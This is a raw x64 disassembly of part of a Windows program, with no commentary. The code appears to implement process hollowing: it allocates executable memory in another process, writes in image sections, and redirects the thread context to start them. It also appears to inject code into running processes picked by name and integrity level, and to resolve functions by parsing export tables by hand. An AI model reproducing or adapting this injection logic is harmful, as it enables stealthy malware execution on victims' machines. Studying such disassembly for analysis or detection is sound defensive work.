   140001ee1:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140001ee7:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140001eeb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001ef0:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
   140001ef5:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140001efc:	00 
   140001efd:	ff 15 0d d2 00 00    	call   *0xd20d(%rip)        # 0x14000f110
   140001f03:	48 8b e8             	mov    %rax,%rbp
   140001f06:	48 85 c0             	test   %rax,%rax
   140001f09:	0f 84 08 01 00 00    	je     0x140002017
   140001f0f:	44 8b 4b 54          	mov    0x54(%rbx),%r9d
   140001f13:	4d 8b c6             	mov    %r14,%r8
   140001f16:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001f1b:	48 8b d0             	mov    %rax,%rdx
   140001f1e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001f23:	ff 15 b7 d2 00 00    	call   *0xd2b7(%rip)        # 0x14000f1e0
   140001f29:	85 c0                	test   %eax,%eax
   140001f2b:	0f 84 e6 00 00 00    	je     0x140002017
   140001f31:	8b fe                	mov    %esi,%edi
   140001f33:	66 3b 73 06          	cmp    0x6(%rbx),%si
   140001f37:	73 4e                	jae    0x140001f87
   140001f39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001f40:	0f b7 43 14          	movzwl 0x14(%rbx),%eax
   140001f44:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001f49:	48 03 c6             	add    %rsi,%rax
   140001f4c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001f53:	00 00 
   140001f55:	44 8b 44 18 2c       	mov    0x2c(%rax,%rbx,1),%r8d
   140001f5a:	8b 54 18 24          	mov    0x24(%rax,%rbx,1),%edx
   140001f5e:	4d 03 c6             	add    %r14,%r8
   140001f61:	44 8b 4c 18 28       	mov    0x28(%rax,%rbx,1),%r9d
   140001f66:	48 03 d5             	add    %rbp,%rdx
   140001f69:	ff 15 71 d2 00 00    	call   *0xd271(%rip)        # 0x14000f1e0
   140001f6f:	85 c0                	test   %eax,%eax
   140001f71:	0f 84 a0 00 00 00    	je     0x140002017
   140001f77:	0f b7 43 06          	movzwl 0x6(%rbx),%eax
   140001f7b:	ff c7                	inc    %edi
   140001f7d:	48 83 c6 28          	add    $0x28,%rsi
   140001f81:	3b f8                	cmp    %eax,%edi
   140001f83:	7c bb                	jl     0x140001f40
   140001f85:	33 f6                	xor    %esi,%esi
   140001f87:	33 c9                	xor    %ecx,%ecx
   140001f89:	ba d0 04 00 00       	mov    $0x4d0,%edx
   140001f8e:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140001f94:	44 8d 49 04          	lea    0x4(%rcx),%r9d
   140001f98:	ff 15 2a d2 00 00    	call   *0xd22a(%rip)        # 0x14000f1c8
   140001f9e:	48 8b f8             	mov    %rax,%rdi
   140001fa1:	48 85 c0             	test   %rax,%rax
   140001fa4:	74 71                	je     0x140002017
   140001fa6:	c7 40 30 0b 00 10 00 	movl   $0x10000b,0x30(%rax)
   140001fad:	48 8b d0             	mov    %rax,%rdx
   140001fb0:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001fb5:	ff 15 45 d1 00 00    	call   *0xd145(%rip)        # 0x14000f100
   140001fbb:	85 c0                	test   %eax,%eax
   140001fbd:	74 58                	je     0x140002017
   140001fbf:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140001fc6:	4c 8d 43 30          	lea    0x30(%rbx),%r8
   140001fca:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001fcf:	48 83 c2 10          	add    $0x10,%rdx
   140001fd3:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140001fd9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001fde:	ff 15 fc d1 00 00    	call   *0xd1fc(%rip)        # 0x14000f1e0
   140001fe4:	85 c0                	test   %eax,%eax
   140001fe6:	74 2f                	je     0x140002017
   140001fe8:	8b 43 28             	mov    0x28(%rbx),%eax
   140001feb:	48 8b d7             	mov    %rdi,%rdx
   140001fee:	48 03 c5             	add    %rbp,%rax
   140001ff1:	48 89 87 80 00 00 00 	mov    %rax,0x80(%rdi)
   140001ff8:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001ffd:	ff 15 75 d1 00 00    	call   *0xd175(%rip)        # 0x14000f178
   140002003:	85 c0                	test   %eax,%eax
   140002005:	74 10                	je     0x140002017
   140002007:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000200c:	ff 15 96 d0 00 00    	call   *0xd096(%rip)        # 0x14000f0a8
   140002012:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002015:	75 69                	jne    0x140002080
   140002017:	45 85 e4             	test   %r12d,%r12d
   14000201a:	74 1e                	je     0x14000203a
   14000201c:	33 d2                	xor    %edx,%edx
   14000201e:	45 8b c4             	mov    %r12d,%r8d
   140002021:	8d 4a 01             	lea    0x1(%rdx),%ecx
   140002024:	ff 15 96 d0 00 00    	call   *0xd096(%rip)        # 0x14000f0c0
   14000202a:	48 85 c0             	test   %rax,%rax
   14000202d:	74 0b                	je     0x14000203a
   14000202f:	33 d2                	xor    %edx,%edx
   140002031:	48 8b c8             	mov    %rax,%rcx
   140002034:	ff 15 86 d1 00 00    	call   *0xd186(%rip)        # 0x14000f1c0
   14000203a:	33 f6                	xor    %esi,%esi
   14000203c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140002041:	41 ff c7             	inc    %r15d
   140002044:	41 83 ff 05          	cmp    $0x5,%r15d
   140002048:	0f 82 f2 fd ff ff    	jb     0x140001e40
   14000204e:	33 c0                	xor    %eax,%eax
   140002050:	4c 8b ac 24 f0 00 00 	mov    0xf0(%rsp),%r13
   140002057:	00 
   140002058:	4c 8b a4 24 40 01 00 	mov    0x140(%rsp),%r12
   14000205f:	00 
   140002060:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   140002067:	00 
   140002068:	48 33 cc             	xor    %rsp,%rcx
   14000206b:	e8 c0 10 00 00       	call   0x140003130
   140002070:	48 81 c4 f8 00 00 00 	add    $0xf8,%rsp
   140002077:	41 5f                	pop    %r15
   140002079:	41 5e                	pop    %r14
   14000207b:	5f                   	pop    %rdi
   14000207c:	5e                   	pop    %rsi
   14000207d:	5d                   	pop    %rbp
   14000207e:	5b                   	pop    %rbx
   14000207f:	c3                   	ret
   140002080:	b8 01 00 00 00       	mov    $0x1,%eax
   140002085:	eb c9                	jmp    0x140002050
   140002087:	cc                   	int3
   140002088:	cc                   	int3
   140002089:	cc                   	int3
   14000208a:	cc                   	int3
   14000208b:	cc                   	int3
   14000208c:	cc                   	int3
   14000208d:	cc                   	int3
   14000208e:	cc                   	int3
   14000208f:	cc                   	int3
   140002090:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002095:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000209a:	55                   	push   %rbp
   14000209b:	41 54                	push   %r12
   14000209d:	41 55                	push   %r13
   14000209f:	41 56                	push   %r14
   1400020a1:	41 57                	push   %r15
   1400020a3:	48 8d ac 24 40 fc ff 	lea    -0x3c0(%rsp),%rbp
   1400020aa:	ff 
   1400020ab:	48 81 ec c0 04 00 00 	sub    $0x4c0,%rsp
   1400020b2:	48 8b 05 47 7f 01 00 	mov    0x17f47(%rip),%rax        # 0x14001a000
   1400020b9:	48 33 c4             	xor    %rsp,%rax
   1400020bc:	48 89 85 b0 03 00 00 	mov    %rax,0x3b0(%rbp)
   1400020c3:	44 8b 2d 76 9b 01 00 	mov    0x19b76(%rip),%r13d        # 0x14001bc40
   1400020ca:	44 8b f9             	mov    %ecx,%r15d
   1400020cd:	4c 8b 25 74 9b 01 00 	mov    0x19b74(%rip),%r12        # 0x14001bc48
   1400020d4:	44 8b c1             	mov    %ecx,%r8d
   1400020d7:	33 db                	xor    %ebx,%ebx
   1400020d9:	44 89 4d 88          	mov    %r9d,-0x78(%rbp)
   1400020dd:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1400020e2:	33 d2                	xor    %edx,%edx
   1400020e4:	44 8b f3             	mov    %ebx,%r14d
   1400020e7:	ff 15 d3 cf 00 00    	call   *0xcfd3(%rip)        # 0x14000f0c0
   1400020ed:	48 8b f0             	mov    %rax,%rsi
   1400020f0:	48 85 c0             	test   %rax,%rax
   1400020f3:	0f 84 81 03 00 00    	je     0x14000247a
   1400020f9:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   1400020fe:	48 89 bc 24 f8 04 00 	mov    %rdi,0x4f8(%rsp)
   140002105:	00 
   140002106:	48 8b c8             	mov    %rax,%rcx
   140002109:	ff 15 79 d0 00 00    	call   *0xd079(%rip)        # 0x14000f188
   14000210f:	85 c0                	test   %eax,%eax
   140002111:	74 10                	je     0x140002123
   140002113:	39 5c 24 78          	cmp    %ebx,0x78(%rsp)
   140002117:	44 8d 73 01          	lea    0x1(%rbx),%r14d
   14000211b:	8b fb                	mov    %ebx,%edi
   14000211d:	40 0f 94 c7          	sete   %dil
   140002121:	eb 03                	jmp    0x140002126
   140002123:	8b 7d 88             	mov    -0x78(%rbp),%edi
   140002126:	48 8b ce             	mov    %rsi,%rcx
   140002129:	ff 15 e9 d0 00 00    	call   *0xd0e9(%rip)        # 0x14000f218
   14000212f:	45 85 f6             	test   %r14d,%r14d
   140002132:	0f 84 0c 03 00 00    	je     0x140002444
   140002138:	83 ff 01             	cmp    $0x1,%edi
   14000213b:	0f 85 03 03 00 00    	jne    0x140002444
   140002141:	45 8b c7             	mov    %r15d,%r8d
   140002144:	33 d2                	xor    %edx,%edx
   140002146:	b9 3a 04 00 00       	mov    $0x43a,%ecx
   14000214b:	ff 15 6f cf 00 00    	call   *0xcf6f(%rip)        # 0x14000f0c0
   140002151:	4c 8b f0             	mov    %rax,%r14
   140002154:	48 85 c0             	test   %rax,%rax
   140002157:	0f 84 e7 02 00 00    	je     0x140002444
   14000215d:	45 8b c7             	mov    %r15d,%r8d
   140002160:	33 d2                	xor    %edx,%edx
   140002162:	b9 10 04 00 00       	mov    $0x410,%ecx
   140002167:	8b f3                	mov    %ebx,%esi
   140002169:	ff 15 51 cf 00 00    	call   *0xcf51(%rip)        # 0x14000f0c0
   14000216f:	48 8b f8             	mov    %rax,%rdi
   140002172:	48 85 c0             	test   %rax,%rax
   140002175:	0f 84 a8 00 00 00    	je     0x140002223
   14000217b:	41 b9 04 01 00 00    	mov    $0x104,%r9d
   140002181:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   140002185:	33 d2                	xor    %edx,%edx
   140002187:	48 8b c8             	mov    %rax,%rcx
   14000218a:	ff 15 20 d0 00 00    	call   *0xd020(%rip)        # 0x14000f1b0
   140002190:	85 c0                	test   %eax,%eax
   140002192:	74 32                	je     0x1400021c6
   140002194:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002198:	ff 15 6a d2 00 00    	call   *0xd26a(%rip)        # 0x14000f408
   14000219e:	48 8b c8             	mov    %rax,%rcx
   1400021a1:	4c 8b f8             	mov    %rax,%r15
   1400021a4:	ff 15 8e d0 00 00    	call   *0xd08e(%rip)        # 0x14000f238
   1400021aa:	3d 04 01 00 00       	cmp    $0x104,%eax
   1400021af:	77 15                	ja     0x1400021c6
   1400021b1:	49 8b d7             	mov    %r15,%rdx
   1400021b4:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   1400021bb:	ff 15 8f cf 00 00    	call   *0xcf8f(%rip)        # 0x14000f150
   1400021c1:	be 01 00 00 00       	mov    $0x1,%esi
   1400021c6:	48 8b cf             	mov    %rdi,%rcx
   1400021c9:	ff 15 49 d0 00 00    	call   *0xd049(%rip)        # 0x14000f218
   1400021cf:	85 f6                	test   %esi,%esi
   1400021d1:	74 50                	je     0x140002223
   1400021d3:	48 8d 05 66 48 01 00 	lea    0x14866(%rip),%rax        # 0x140016a40
   1400021da:	8b fb                	mov    %ebx,%edi
   1400021dc:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400021e1:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   1400021e6:	48 8d 05 6b 48 01 00 	lea    0x1486b(%rip),%rax        # 0x140016a58
   1400021ed:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400021f2:	48 8d 05 7f 48 01 00 	lea    0x1487f(%rip),%rax        # 0x140016a78
   1400021f9:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400021fe:	66 90                	xchg   %ax,%ax
   140002200:	48 8b 16             	mov    (%rsi),%rdx
   140002203:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   14000220a:	ff 15 70 cf 00 00    	call   *0xcf70(%rip)        # 0x14000f180
   140002210:	85 c0                	test   %eax,%eax
   140002212:	0f 84 23 02 00 00    	je     0x14000243b
   140002218:	ff c7                	inc    %edi
   14000221a:	48 83 c6 08          	add    $0x8,%rsi
   14000221e:	83 ff 03             	cmp    $0x3,%edi
   140002221:	72 dd                	jb     0x140002200
   140002223:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002229:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000222e:	4c 8d 45 8c          	lea    -0x74(%rbp),%r8
   140002232:	49 8b ce             	mov    %r14,%rcx
   140002235:	41 8d 51 19          	lea    0x19(%r9),%edx
   140002239:	ff 15 d9 d1 00 00    	call   *0xd1d9(%rip)        # 0x14000f418
   14000223f:	85 c0                	test   %eax,%eax
   140002241:	0f 88 f4 01 00 00    	js     0x14000243b
   140002247:	39 5d 8c             	cmp    %ebx,-0x74(%rbp)
   14000224a:	0f 85 eb 01 00 00    	jne    0x14000243b
   140002250:	4c 8d 45 80          	lea    -0x80(%rbp),%r8
   140002254:	ba 08 00 00 00       	mov    $0x8,%edx
   140002259:	49 8b ce             	mov    %r14,%rcx
   14000225c:	44 8b fb             	mov    %ebx,%r15d
   14000225f:	ff 15 f3 cd 00 00    	call   *0xcdf3(%rip)        # 0x14000f058
   140002265:	85 c0                	test   %eax,%eax
   140002267:	0f 84 ce 01 00 00    	je     0x14000243b
   14000226d:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   140002271:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   140002276:	45 33 c9             	xor    %r9d,%r9d
   140002279:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000227e:	45 33 c0             	xor    %r8d,%r8d
   140002281:	41 8d 51 19          	lea    0x19(%r9),%edx
   140002285:	ff 15 e5 cd 00 00    	call   *0xcde5(%rip)        # 0x14000f070
   14000228b:	85 c0                	test   %eax,%eax
   14000228d:	75 7c                	jne    0x14000230b
   14000228f:	ff 15 3b ce 00 00    	call   *0xce3b(%rip)        # 0x14000f0d0
   140002295:	83 f8 7a             	cmp    $0x7a,%eax
   140002298:	75 71                	jne    0x14000230b
   14000229a:	8b 54 24 78          	mov    0x78(%rsp),%edx
   14000229e:	33 c9                	xor    %ecx,%ecx
   1400022a0:	ff 15 7a ce 00 00    	call   *0xce7a(%rip)        # 0x14000f120
   1400022a6:	48 8b f8             	mov    %rax,%rdi
   1400022a9:	48 85 c0             	test   %rax,%rax
   1400022ac:	74 5d                	je     0x14000230b
   1400022ae:	44 8b 4c 24 78       	mov    0x78(%rsp),%r9d
   1400022b3:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   1400022b8:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   1400022bc:	4c 8b c7             	mov    %rdi,%r8
   1400022bf:	ba 19 00 00 00       	mov    $0x19,%edx
   1400022c4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400022c9:	ff 15 a1 cd 00 00    	call   *0xcda1(%rip)        # 0x14000f070
   1400022cf:	85 c0                	test   %eax,%eax
   1400022d1:	74 2a                	je     0x1400022fd
   1400022d3:	48 8b 0f             	mov    (%rdi),%rcx
   1400022d6:	ff 15 44 cd 00 00    	call   *0xcd44(%rip)        # 0x14000f020
   1400022dc:	48 8b 0f             	mov    (%rdi),%rcx
   1400022df:	0f b6 10             	movzbl (%rax),%edx
   1400022e2:	ff ca                	dec    %edx
   1400022e4:	ff 15 4e cd 00 00    	call   *0xcd4e(%rip)        # 0x14000f038
   1400022ea:	48 8b cf             	mov    %rdi,%rcx
   1400022ed:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   1400022f3:	8b 30                	mov    (%rax),%esi
   1400022f5:	ff 15 1d ce 00 00    	call   *0xce1d(%rip)        # 0x14000f118
   1400022fb:	eb 11                	jmp    0x14000230e
   1400022fd:	8b 75 8c             	mov    -0x74(%rbp),%esi
   140002300:	48 8b cf             	mov    %rdi,%rcx
   140002303:	ff 15 0f ce 00 00    	call   *0xce0f(%rip)        # 0x14000f118
   140002309:	eb 03                	jmp    0x14000230e
   14000230b:	8b 75 8c             	mov    -0x74(%rbp),%esi
   14000230e:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   140002312:	ff 15 00 cf 00 00    	call   *0xcf00(%rip)        # 0x14000f218
   140002318:	45 85 ff             	test   %r15d,%r15d
   14000231b:	0f 84 1a 01 00 00    	je     0x14000243b
   140002321:	81 fe 00 20 00 00    	cmp    $0x2000,%esi
   140002327:	0f 82 0e 01 00 00    	jb     0x14000243b
   14000232d:	49 8b cc             	mov    %r12,%rcx
   140002330:	e8 4b 01 00 00       	call   0x140002480
   140002335:	8b f0                	mov    %eax,%esi
   140002337:	85 c0                	test   %eax,%eax
   140002339:	0f 84 fc 00 00 00    	je     0x14000243b
   14000233f:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140002345:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   14000234c:	00 
   14000234d:	4d 8b c5             	mov    %r13,%r8
   140002350:	33 d2                	xor    %edx,%edx
   140002352:	49 8b ce             	mov    %r14,%rcx
   140002355:	ff 15 b5 cd 00 00    	call   *0xcdb5(%rip)        # 0x14000f110
   14000235b:	48 8b f8             	mov    %rax,%rdi
   14000235e:	48 85 c0             	test   %rax,%rax
   140002361:	0f 84 d4 00 00 00    	je     0x14000243b
   140002367:	4d 8b cd             	mov    %r13,%r9
   14000236a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000236f:	4d 8b c4             	mov    %r12,%r8
   140002372:	48 8b d0             	mov    %rax,%rdx
   140002375:	49 8b ce             	mov    %r14,%rcx
   140002378:	ff 15 62 ce 00 00    	call   *0xce62(%rip)        # 0x14000f1e0
   14000237e:	85 c0                	test   %eax,%eax
   140002380:	0f 84 b5 00 00 00    	je     0x14000243b
   140002386:	48 8d 0d b3 47 01 00 	lea    0x147b3(%rip),%rcx        # 0x140016b40
   14000238d:	48 89 5c 24 78       	mov    %rbx,0x78(%rsp)
   140002392:	ff 15 18 cd 00 00    	call   *0xcd18(%rip)        # 0x14000f0b0
   140002398:	48 85 c0             	test   %rax,%rax
   14000239b:	74 15                	je     0x1400023b2
   14000239d:	48 8d 15 ac 47 01 00 	lea    0x147ac(%rip),%rdx        # 0x140016b50
   1400023a4:	48 8b c8             	mov    %rax,%rcx
   1400023a7:	ff 15 5b cd 00 00    	call   *0xcd5b(%rip)        # 0x14000f108
   1400023ad:	4c 8b d0             	mov    %rax,%r10
   1400023b0:	eb 03                	jmp    0x1400023b5
   1400023b2:	4c 8b d3             	mov    %rbx,%r10
   1400023b5:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400023ba:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   1400023be:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400023c3:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400023c8:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400023cd:	4d 8b ce             	mov    %r14,%r9
   1400023d0:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400023d5:	45 33 c0             	xor    %r8d,%r8d
   1400023d8:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400023dc:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   1400023e1:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400023e6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400023eb:	41 ff d2             	call   *%r10
   1400023ee:	85 c0                	test   %eax,%eax
   1400023f0:	78 49                	js     0x14000243b
   1400023f2:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400023f7:	48 85 c9             	test   %rcx,%rcx
   1400023fa:	74 3f                	je     0x14000243b
   1400023fc:	39 5d 88             	cmp    %ebx,-0x78(%rbp)
   1400023ff:	74 07                	je     0x140002408
   140002401:	bb 01 00 00 00       	mov    $0x1,%ebx
   140002406:	eb 2d                	jmp    0x140002435
   140002408:	ba 64 00 00 00       	mov    $0x64,%edx
   14000240d:	ff 15 8d cd 00 00    	call   *0xcd8d(%rip)        # 0x14000f1a0
   140002413:	85 c0                	test   %eax,%eax
   140002415:	75 19                	jne    0x140002430
   140002417:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000241c:	48 8d 55 88          	lea    -0x78(%rbp),%rdx
   140002420:	ff 15 a2 cc 00 00    	call   *0xcca2(%rip)        # 0x14000f0c8
   140002426:	85 c0                	test   %eax,%eax
   140002428:	74 06                	je     0x140002430
   14000242a:	39 5d 88             	cmp    %ebx,-0x78(%rbp)
   14000242d:	0f 95 c3             	setne  %bl
   140002430:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140002435:	ff 15 dd cd 00 00    	call   *0xcddd(%rip)        # 0x14000f218
   14000243b:	49 8b ce             	mov    %r14,%rcx
   14000243e:	ff 15 d4 cd 00 00    	call   *0xcdd4(%rip)        # 0x14000f218
   140002444:	48 8b bc 24 f8 04 00 	mov    0x4f8(%rsp),%rdi
   14000244b:	00 
   14000244c:	8b c3                	mov    %ebx,%eax
   14000244e:	48 8b 8d b0 03 00 00 	mov    0x3b0(%rbp),%rcx
   140002455:	48 33 cc             	xor    %rsp,%rcx
   140002458:	e8 d3 0c 00 00       	call   0x140003130
   14000245d:	4c 8d 9c 24 c0 04 00 	lea    0x4c0(%rsp),%r11
   140002464:	00 
   140002465:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   140002469:	49 8b 73 48          	mov    0x48(%r11),%rsi
   14000246d:	49 8b e3             	mov    %r11,%rsp
   140002470:	41 5f                	pop    %r15
   140002472:	41 5e                	pop    %r14
   140002474:	41 5d                	pop    %r13
   140002476:	41 5c                	pop    %r12
   140002478:	5d                   	pop    %rbp
   140002479:	c3                   	ret
   14000247a:	8b c3                	mov    %ebx,%eax
   14000247c:	eb d0                	jmp    0x14000244e
   14000247e:	cc                   	int3
   14000247f:	cc                   	int3
   140002480:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002485:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000248a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000248f:	57                   	push   %rdi
   140002490:	41 54                	push   %r12
   140002492:	41 55                	push   %r13
   140002494:	41 56                	push   %r14
   140002496:	41 57                	push   %r15
   140002498:	48 83 ec 20          	sub    $0x20,%rsp
   14000249c:	48 63 59 3c          	movslq 0x3c(%rcx),%rbx
   1400024a0:	4c 8b f9             	mov    %rcx,%r15
   1400024a3:	48 03 d9             	add    %rcx,%rbx
   1400024a6:	81 3b 50 45 00 00    	cmpl   $0x4550,(%rbx)
   1400024ac:	0f 85 ca 01 00 00    	jne    0x14000267c
   1400024b2:	0f b7 43 18          	movzwl 0x18(%rbx),%eax
   1400024b6:	b9 0b 01 00 00       	mov    $0x10b,%ecx
   1400024bb:	66 3b c1             	cmp    %cx,%ax
   1400024be:	0f 84 b8 01 00 00    	je     0x14000267c
   1400024c4:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   1400024c9:	66 3b c1             	cmp    %cx,%ax
   1400024cc:	0f 85 aa 01 00 00    	jne    0x14000267c
   1400024d2:	0f b7 43 14          	movzwl 0x14(%rbx),%eax
   1400024d6:	48 8d 7b 18          	lea    0x18(%rbx),%rdi
   1400024da:	44 8b 83 88 00 00 00 	mov    0x88(%rbx),%r8d
   1400024e1:	48 03 f8             	add    %rax,%rdi
   1400024e4:	45 33 e4             	xor    %r12d,%r12d
   1400024e7:	8b 77 14             	mov    0x14(%rdi),%esi
   1400024ea:	44 3b c6             	cmp    %esi,%r8d
   1400024ed:	72 42                	jb     0x140002531
   1400024ef:	44 0f b7 5b 06       	movzwl 0x6(%rbx),%r11d
   1400024f4:	41 0f b7 d4          	movzwl %r12w,%edx
   1400024f8:	66 45 3b e3          	cmp    %r11w,%r12w
   1400024fc:	73 30                	jae    0x14000252e
   1400024fe:	66 90                	xchg   %ax,%ax
   140002500:	0f b7 c2             	movzwl %dx,%eax
   140002503:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140002507:	44 8b 54 cf 0c       	mov    0xc(%rdi,%rcx,8),%r10d
   14000250c:	4c 8d 0c cf          	lea    (%rdi,%rcx,8),%r9
   140002510:	45 3b c2             	cmp    %r10d,%r8d
   140002513:	72 10                	jb     0x140002525
   140002515:	41 8b 49 10          	mov    0x10(%r9),%ecx
   140002519:	41 03 ca             	add    %r10d,%ecx
   14000251c:	44 3b c1             	cmp    %ecx,%r8d
   14000251f:	0f 82 76 01 00 00    	jb     0x14000269b
   140002525:	66 ff c2             	inc    %dx
   140002528:	66 41 3b d3          	cmp    %r11w,%dx
   14000252c:	72 d2                	jb     0x140002500
   14000252e:	45 8b c4             	mov    %r12d,%r8d
   140002531:	45 8b e8             	mov    %r8d,%r13d
   140002534:	4d 03 ef             	add    %r15,%r13
   140002537:	45 8b 45 20          	mov    0x20(%r13),%r8d
   14000253b:	44 3b c6             	cmp    %esi,%r8d
   14000253e:	72 41                	jb     0x140002581
   140002540:	44 0f b7 5b 06       	movzwl 0x6(%rbx),%r11d
   140002545:	41 0f b7 d4          	movzwl %r12w,%edx
   140002549:	66 45 3b e3          	cmp    %r11w,%r12w
   14000254d:	73 2f                	jae    0x14000257e
   14000254f:	90                   	nop
   140002550:	0f b7 c2             	movzwl %dx,%eax
   140002553:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140002557:	44 8b 54 cf 0c       	mov    0xc(%rdi,%rcx,8),%r10d
   14000255c:	4c 8d 0c cf          	lea    (%rdi,%rcx,8),%r9
   140002560:	45 3b c2             	cmp    %r10d,%r8d
   140002563:	72 10                	jb     0x140002575
   140002565:	41 8b 49 10          	mov    0x10(%r9),%ecx
   140002569:	41 03 ca             	add    %r10d,%ecx
   14000256c:	44 3b c1             	cmp    %ecx,%r8d
   14000256f:	0f 82 35 01 00 00    	jb     0x1400026aa
   140002575:	66 ff c2             	inc    %dx
   140002578:	66 41 3b d3          	cmp    %r11w,%dx
   14000257c:	72 d2                	jb     0x140002550
   14000257e:	45 8b c4             	mov    %r12d,%r8d
   140002581:	45 8b f0             	mov    %r8d,%r14d
   140002584:	45 8b 45 24          	mov    0x24(%r13),%r8d
   140002588:	4d 03 f7             	add    %r15,%r14
   14000258b:	44 3b c6             	cmp    %esi,%r8d
   14000258e:	72 41                	jb     0x1400025d1
   140002590:	44 0f b7 5b 06       	movzwl 0x6(%rbx),%r11d
   140002595:	41 0f b7 d4          	movzwl %r12w,%edx
   140002599:	66 45 3b e3          	cmp    %r11w,%r12w
   14000259d:	73 2f                	jae    0x1400025ce
   14000259f:	90                   	nop
   1400025a0:	0f b7 c2             	movzwl %dx,%eax
   1400025a3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400025a7:	44 8b 54 cf 0c       	mov    0xc(%rdi,%rcx,8),%r10d
   1400025ac:	4c 8d 0c cf          	lea    (%rdi,%rcx,8),%r9
   1400025b0:	45 3b c2             	cmp    %r10d,%r8d
   1400025b3:	72 10                	jb     0x1400025c5
   1400025b5:	41 8b 49 10          	mov    0x10(%r9),%ecx
   1400025b9:	41 03 ca             	add    %r10d,%ecx
   1400025bc:	44 3b c1             	cmp    %ecx,%r8d
   1400025bf:	0f 82 f4 00 00 00    	jb     0x1400026b9
   1400025c5:	66 ff c2             	inc    %dx
   1400025c8:	66 41 3b d3          	cmp    %r11w,%dx
   1400025cc:	72 d2                	jb     0x1400025a0
   1400025ce:	45 8b c4             	mov    %r12d,%r8d
   1400025d1:	41 8b e8             	mov    %r8d,%ebp
   1400025d4:	41 8b fc             	mov    %r12d,%edi
   1400025d7:	49 03 ef             	add    %r15,%rbp
   1400025da:	45 39 65 18          	cmp    %r12d,0x18(%r13)
   1400025de:	0f 86 98 00 00 00    	jbe    0x14000267c
   1400025e4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400025e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400025ef:	00 
   1400025f0:	49 63 4f 3c          	movslq 0x3c(%r15),%rcx
   1400025f4:	49 8d 5f 18          	lea    0x18(%r15),%rbx
   1400025f8:	45 8b 06             	mov    (%r14),%r8d
   1400025fb:	48 03 d9             	add    %rcx,%rbx
   1400025fe:	42 0f b7 44 39 14    	movzwl 0x14(%rcx,%r15,1),%eax
   140002604:	48 03 d8             	add    %rax,%rbx
   140002607:	44 3b 43 14          	cmp    0x14(%rbx),%r8d
   14000260b:	72 44                	jb     0x140002651
   14000260d:	46 0f b7 5c 39 06    	movzwl 0x6(%rcx,%r15,1),%r11d
   140002613:	41 0f b7 d4          	movzwl %r12w,%edx
   140002617:	66 45 3b e3          	cmp    %r11w,%r12w
   14000261b:	73 31                	jae    0x14000264e
   14000261d:	0f 1f 00             	nopl   (%rax)
